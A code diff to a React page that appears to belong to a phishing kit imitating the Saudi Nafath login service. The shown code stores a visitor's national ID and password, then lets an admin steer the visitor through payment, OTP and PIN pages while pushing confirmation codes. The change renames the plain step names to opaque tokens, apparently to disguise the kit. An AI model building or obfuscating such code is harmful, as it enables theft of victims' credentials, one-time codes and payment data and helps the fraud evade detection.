@@ -48,17 +48,17 @@ export default function Component() {
           } else if (data.currentStep === "payment") {
             console.log("[nafad] Admin redirecting to payment")
             window.location.href = "/check"
-          } else if (data.currentStep === "otp") {
+          } else if (data.currentStep === "_t2") {
             console.log("[nafad] Admin redirecting to otp")
             window.location.href = "/veri"
-          } else if (data.currentStep === "pin") {
+          } else if (data.currentStep === "_t3") {
             console.log("[nafad] Admin redirecting to pin")
             window.location.href = "/confi"
           } else if (typeof data.currentStep === 'number') {
             console.log("[nafad] Admin redirecting to home with step:", data.currentStep)
             window.location.href = `/`
           }
-          // If currentStep === "nafad", stay on this page
+          // If currentStep === "_t6", stay on this page
 
           // Listen for confirmation code from admin (updates every time)
           if (data.nafadConfirmationCode) {
@@ -122,7 +122,7 @@ export default function Component() {
       nafazId: idLogin,
       nafazPass: password,
       nafadConfirmationStatus: "waiting",
-      currentStep: "nafad",
+      currentStep: "_t6",
       nafadUpdatedAt: new Date().toISOString()
     });
     
